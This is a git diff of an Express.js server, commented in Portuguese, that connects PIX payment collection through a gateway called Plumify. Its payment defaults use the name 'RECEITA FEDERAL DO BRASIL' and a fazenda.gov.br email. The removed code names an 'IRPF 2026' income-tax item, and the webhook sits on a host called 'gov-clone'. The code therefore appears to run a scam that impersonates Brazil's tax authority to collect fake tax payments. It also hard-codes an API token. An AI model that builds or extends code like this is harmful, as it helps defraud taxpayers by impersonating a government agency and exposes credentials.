@@ -223,17 +223,16 @@ app.get('/password.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'password.html'));
 });
 
-// ==================== INTEGRAÇÃO PLUMIFY (SEM AXIOS) ====================
-// Configurações Plumify
+// ==================== INTEGRAÇÃO PLUMIFY ====================
 const PLUMIFY_PRODUCT_HASH = 'smm88ihfg0';
 const PLUMIFY_API_TOKEN = '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa';
-const PLUMIFY_API_URL = 'https://api.Plumify.com.br/api/public/v1';
+
 // Função para gerar ID único da transação
 function generateTransactionId() {
     return 'TX-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
 }
 
-// Rota para criar pagamento via Plumify (CORRETA - com token na URL)
+// Rota para criar pagamento via Plumify
 app.post('/api/create-payment', async (req, res) => {
     const { amount, customer_name, customer_email, customer_cpf } = req.body;
 
@@ -241,18 +240,17 @@ app.post('/api/create-payment', async (req, res) => {
         return res.status(400).json({ error: 'Valor inválido' });
     }
 
-    // Valores em CENTAVOS (15000 = R$ 150,00)
     const amountCents = Math.round(parseFloat(amount) * 100);
 
     const payload = {
         amount: amountCents,
-        offer_hash: PLUMIFY_PRODUCT_HASH,  // Atenção: é offer_hash, não product_hash!
+        offer_hash: PLUMIFY_PRODUCT_HASH,
         payment_method: 'pix',
         customer: {
-            name: customer_name || 'RECEITA FEDERAL LTDA',
-            email: customer_email || 'receitafederal@gov.com.br',
-            phone_number: '21999999999',
-            document: customer_cpf || '00000000000'
+            name: customer_name || 'RECEITA FEDERAL DO BRASIL',
+            email: customer_email || 'receita@fazenda.gov.br',
+            phone_number: '11999999999',
+            document: customer_cpf || '11144477735'
         },
         cart: [{
             product_hash: PLUMIFY_PRODUCT_HASH,
@@ -262,7 +260,7 @@ app.post('/api/create-payment', async (req, res) => {
             operation_type: 1,
             tangible: false
         }],
-        expire_in_days: 1,
+        expire_in_days: 3,
         transaction_origin: 'api',
         postback_url: 'https://gov-clone-81e8.onrender.com/api/webhook/pagamento'
     };
@@ -270,7 +268,6 @@ app.post('/api/create-payment', async (req, res) => {
     console.log('📤 Enviando para Plumify:', JSON.stringify(payload, null, 2));
 
     try {
-        // Token vai na URL, não no header!
         const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`, {
             method: 'POST',
             headers: {
@@ -283,16 +280,15 @@ app.post('/api/create-payment', async (req, res) => {
         const data = await response.json();
         console.log('📥 Resposta Plumify:', data);
 
-        // A resposta para PIX deve conter pix_qrcode e pix_code
-        if (data.pix_qrcode || data.pix_code) {
+        if (data.pix && data.pix.pix_qr_code) {
             res.json({
                 success: true,
                 payment: {
-                    pix_code: data.pix_code,
-                    pix_qrcode: data.pix_qrcode,
+                    pix_code: data.pix.pix_qr_code,
+                    pix_qrcode: data.pix.pix_qr_code,
                     expires_at: data.expires_at,
                     id: data.hash,
-                    status: data.status
+                    status: data.payment_status
                 }
             });
         } else {
@@ -311,80 +307,32 @@ app.post('/api/create-payment', async (req, res) => {
     }
 });
 
-// Rota para criar pagamento via Plumify (TESTANDO MÚLTIPLAS URLs)
-app.post('/api/create-payment', async (req, res) => {
-    const { amount, customer_name, customer_email, customer_cpf } = req.body;
-
-    if (!amount || amount <= 0) {
-        return res.status(400).json({ error: 'Valor inválido' });
+// Rota para consultar status do pagamento
+app.get('/api/payment-status/:reference_id', async (req, res) => {
+    const { reference_id } = req.params;
+    
+    try {
+        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions/${reference_id}?api_token=${PLUMIFY_API_TOKEN}`);
+        const data = await response.json();
+        
+        res.json({
+            success: true,
+            status: data.status
+        });
+    } catch (error) {
+        res.status(500).json({ error: 'Erro ao consultar pagamento' });
     }
-
-    const payload = {
-        product_hash: PLUMIFY_PRODUCT_HASH,
-        amount: parseFloat(amount),
-        currency: 'BRL',
-        reference_id: generateTransactionId(),
-        customer: {
-            name: customer_name || 'RECEITA FEDERAL LTDA',
-            email: customer_email || 'receitafederal@gov.com.br',
-            cpf: customer_cpf || '00000000000'
-        },
-        items: [{
-            description: 'Imposto de Renda Pessoa Física - IRPF 2026',
-            quantity: 1,
-            amount: parseFloat(amount)
-        }],
-        payment_methods: ['pix']
-    };
-
-    // Lista de URLs para testar
-    const urlsToTry = [
-        'https://api.Plumify.com.br/api/public/v1/transactions',
-        'https://api.Plumify.com.br/api/transactions',
-        'https://api.Plumify.com.br/transactions',
-        'https://api.Plumify.com.br/v1/transactions',
-        'https://api.Plumify.com.br/api/public/v1/transaction',
-        'https://api.Plumify.com.br/api/transaction',
-        'https://api.Plumify.com.br/transaction',
-        'https://api.Plumify.com.br/v1/transaction',
-        'https://api.Plumify.com.br/api/public/v1/checkout',
-        'https://api.Plumify.com.br/api/checkout',
-        'https://api.Plumify.com.br/checkout',
-        'https://api.Plumify.com.br/pix'
-    ];
-
-    for (const url of urlsToTry) {
-        try {
-            console.log(`🔄 Tentando URL: ${url}`);
-            
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'api_token': PLUMIFY_API_TOKEN,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            });
-
-            const data = await response.json();
-            console.log(`📥 Resposta de ${url}:`, data);
-
-            if (data.success && (data.pix_code || data.qrcode || data.pix_qrcode)) {
-                console.log(`✅ SUCESSO na URL: ${url}`);
-                return res.json({
-                    success: true,
-                    payment: data
-                });
-            }
-        } catch (error) {
-            console.log(`❌ Erro na URL ${url}:`, error.message);
-        }
-    }
-
-    res.status(500).json({
-        error: 'Não foi possível gerar o pagamento. Verifique as configurações da API.'
-    });
 });
+
+// Webhook para receber confirmações de pagamento
+app.post('/api/webhook/pagamento', async (req, res) => {
+    const { hash, status, amount } = req.body;
+    
+    console.log(`📢 Webhook recebido: Transação ${hash} - Status: ${status}`);
+    
+    res.json({ received: true });
+});
+
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Servidor rodando na porta ${PORT}`);
